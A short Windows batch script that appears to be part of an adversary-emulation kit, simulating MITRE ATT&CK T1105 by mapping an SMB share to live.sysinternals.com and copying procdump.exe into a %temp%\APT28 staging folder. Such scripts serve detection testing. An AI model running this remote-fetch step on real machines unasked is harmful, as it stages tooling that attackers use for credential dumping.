@ECHO OFF
CLS
color 0E


ECHO ===================================================================
ECHO Technique: Remote File Copy 	(T1105)
ECHO.
ECHO [+] Simulates Remote File Copy using SMB
ECHO -------------------------------------------------------------------
net use Z: \\live.sysinternals.com
COPY /Y "Z:\procdump.exe" %temp%\APT28\
ping 127.0.0.1 -n 4 > nul
net use Z: /delete /Y
ECHO.

